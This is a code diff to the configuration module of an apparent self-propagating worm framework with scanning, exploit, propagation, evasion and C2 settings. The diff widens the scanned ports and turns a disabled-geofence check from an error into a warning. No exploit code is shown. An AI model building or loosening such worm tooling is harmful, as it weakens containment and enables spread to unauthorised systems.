@@ -16,18 +16,19 @@ from dataclasses import dataclass, field
 from typing import Any, Dict, List
 
 import yaml
+from utils.logger import logger
 
 
 @dataclass
 class NetworkConfig:
     """Network scanning and targeting configuration"""
 
-    target_ranges: List[str] = field(default_factory=lambda: ["192.168.1.0/24"])
-    excluded_ips: List[str] = field(default_factory=lambda: ["192.168.1.1"])  # Router, etc.
+    target_ranges: List[str] = field(default_factory=lambda: ["192.168.100.0/24"])
+    excluded_ips: List[str] = field(default_factory=lambda: ["192.168.100.1"])  # Router, etc.
     scan_timeout: int = 5
     max_threads: int = 50
     ports_to_scan: List[int] = field(
-        default_factory=lambda: [21, 22, 23, 80, 135, 139, 443, 445, 3389, 5985, 8080]
+        default_factory=lambda: [21, 22, 23, 80, 135, 139, 443, 445, 3389, 5985, 2222, 8080, 8443, 6379, 5672, 27017, 5432, 3306, 1433, 9200]
     )
 
 
@@ -110,7 +111,7 @@ class SafetyConfig:
     auto_destruct_time: int = 0  # 0 = disabled, otherwise hours
     geofence_enabled: bool = True
     allowed_networks: List[str] = field(
-        default_factory=lambda: ["192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"]
+        default_factory=lambda: ["192.168.100.0/24", "192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"]
     )
     max_runtime_hours: int = 24
     enable_logging: bool = True
@@ -185,7 +186,16 @@ class Config:
                 self._update_dataclass(getattr(self, target_attr), data)
 
         # Apply base config
-        for section in ["network", "exploit", "propagation", "evasion", "c2", "ml", "safety", "metasploit"]:
+        for section in [
+            "network",
+            "exploit",
+            "propagation",
+            "evasion",
+            "c2",
+            "ml",
+            "safety",
+            "metasploit",
+        ]:
             if section in config_data:
                 apply_section(section, config_data[section])
 
@@ -232,7 +242,7 @@ class Config:
             errors.append("❌ Kill switch must be enabled for safety")
 
         if not self.safety.geofence_enabled:
-            errors.append("❌ Geofencing must be enabled for safety")
+            warnings.append("⚠️  Geofencing is disabled — worm may spread outside allowed networks")
 
         if self.propagation.max_infections <= 0:
             errors.append("❌ max_infections must be positive")
@@ -298,24 +308,23 @@ class Config:
         if self.exploit.exploit_timeout < 5:
             warnings.append("⚠️  Very low exploit timeout may cause failures")
 
-        # Print results
         if errors or warnings:
-            print("\n" + "=" * 60)
-            print("CONFIGURATION VALIDATION")
-            print("=" * 60)
+            logger.info(f"\n{'=' * 60}")
+            logger.info("CONFIGURATION VALIDATION")
+            logger.info(f"{'=' * 60}")
 
         if errors:
-            print("\n🔴 ERRORS (must fix):")
+            logger.error("ERRORS (must fix):")
             for error in errors:
-                print(f"  {error}")
+                logger.error(f"  {error}")
 
         if warnings:
-            print("\n🟡 WARNINGS (review recommended):")
+            logger.warning("WARNINGS (review recommended):")
             for warning in warnings:
-                print(f"  {warning}")
+                logger.warning(f"  {warning}")
 
         if errors or warnings:
-            print("=" * 60 + "\n")
+            logger.info(f"{'=' * 60}")
 
         return len(errors) == 0
 
@@ -323,34 +332,30 @@ class Config:
         """Additional validation for aggressive mode configurations"""
         warnings = []
 
-        # Check for dangerous settings
         if self.propagation.max_infections > 1000:
-            warnings.append("⚠️  AGGRESSIVE: Very high infection limit")
+            warnings.append("Very high infection limit")
 
         if self.network.max_threads > 200:
-            warnings.append("⚠️  AGGRESSIVE: Very high thread count")
+            warnings.append("Very high thread count")
 
         if self.propagation.propagation_delay < 0.5:
-            warnings.append("⚠️  AGGRESSIVE: Very fast propagation may trigger detection")
+            warnings.append("Very fast propagation may trigger detection")
 
         if not self.evasion.stealth_mode:
-            warnings.append("⚠️  AGGRESSIVE: Stealth mode disabled - high detection risk")
+            warnings.append("Stealth mode disabled - high detection risk")
 
         if self.safety.max_runtime_hours == 0:
-            warnings.append("⚠️  AGGRESSIVE: No runtime limit set")
+            warnings.append("No runtime limit set")
 
         if self.safety.auto_destruct_time == 0:
-            warnings.append("⚠️  AGGRESSIVE: No auto-destruct timer set")
+            warnings.append("No auto-destruct timer set")
 
         if warnings:
-            print("\n" + "=" * 60)
-            print("⚠️  AGGRESSIVE MODE WARNINGS")
-            print("=" * 60)
+            logger.warning("AGGRESSIVE MODE WARNINGS:")
             for warning in warnings:
-                print(f"  {warning}")
-            print("\nThese settings are intentional for aggressive mode.")
-            print("Ensure you have proper authorization!")
-            print("=" * 60 + "\n")
+                logger.warning(f"  {warning}")
+            logger.warning("These settings are intentional for aggressive mode.")
+            logger.warning("Ensure you have proper authorization!")
 
         return True
 
@@ -400,8 +405,7 @@ config = Config()
 
 
 if __name__ == "__main__":
-    # Example: Create default config file
     config = Config()
     config.save_to_file("config.yaml")
-    print("Default configuration saved to config.yaml")
-    print(config)
+    logger.info("Default configuration saved to config.yaml")
+    logger.info(config)
